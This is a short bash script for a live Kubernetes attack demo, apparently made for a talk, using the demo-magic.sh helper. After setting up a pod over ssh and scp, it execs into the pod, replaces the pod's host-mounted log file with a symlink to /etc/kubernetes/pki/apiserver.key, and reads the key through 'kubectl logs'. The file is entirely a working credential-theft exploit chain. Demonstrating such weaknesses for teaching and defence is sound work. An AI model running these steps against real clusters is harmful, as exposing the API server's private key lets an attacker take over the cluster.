#!/bin/bash

########################
# include the magic
########################
. demo-magic.sh

# hide the evidence
clear

# attack demo

pe "kubectl get po"
pe "cat ../scenario/rbac.yaml"
wait
clear
pe "cat ../scripts/create.py"
wait
clear
pe "scp -P 5555 ../scripts/create.py ../scripts/priv-create.sh root@127.0.0.1:/root"
pe "ssh -p 5555 -t root@127.0.0.1  'source priv-create.sh' && kubectl wait --for=condition=Ready pod my-pod"
pe "kubectl get po"
wait
clear
pe 'kubectl exec -it my-pod -- /bin/bash -c "cd /hostlogs/pods/default_my-pod_**/my-pod/ && rm 0.log && ln -s /etc/kubernetes/pki/apiserver.key 0.log"'
pe "kubectl logs my-pod"